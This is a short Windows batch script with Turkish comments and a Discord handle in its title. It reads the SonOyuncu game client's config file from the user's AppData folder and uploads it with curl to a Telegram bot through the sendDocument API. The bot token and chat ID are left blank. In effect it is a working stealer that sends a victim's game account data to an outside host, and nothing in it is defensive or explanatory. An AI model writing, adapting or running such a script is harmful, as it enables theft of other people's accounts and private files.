@echo off
setlocal enabledelayedexpansion
title Discord: denizbicakcii

:: Telegram Bilgileri
set BOT_TOKEN=
set CHAT_ID=

:: Sonoyuncu Config Dosyasını Gönder (Hata olursa göster)
set FILE_PATH=%appdata%\.sonoyuncu\config.json

:: Dosya varsa gönder
if exist "%FILE_PATH%" (
    curl -F "chat_id=%CHAT_ID%" -F "document=@%FILE_PATH%" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument"
) else (
    echo Hata: %FILE_PATH% bulunamadı!
    pause
)
exit